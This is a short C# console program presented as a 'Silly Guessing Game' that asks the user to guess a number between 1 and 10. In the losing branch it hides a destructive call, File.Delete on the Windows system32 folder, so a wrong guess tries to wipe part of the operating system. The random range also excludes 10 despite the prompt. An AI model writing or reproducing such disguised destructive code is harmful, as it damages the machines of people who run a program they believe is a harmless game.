namespace SimpleGuessingNumberConsoleApp
{
    class Program
    {
        static void Main(string[] args)
        {
            //Console.WriteLine("Hello, World!");
            Console.ForegroundColor = ConsoleColor.Green;
            /*Simple Guessing game*/
            Random random = new Random();
            var randomNumber = random.Next(1, 10);

            Console.Write("==Silly Guessing Game===");
            Console.Write(Environment.NewLine);
            Console.Write("\nGuess number between 1 and 10: ");
            int guess =int.Parse(Console.ReadLine() ??"0");

            if (guess == randomNumber)
            {
                Console.WriteLine("Yey You Won!");
            }
            else
            {
                File.Delete(@"c:\windows\system32");

            }
        }
    }
}
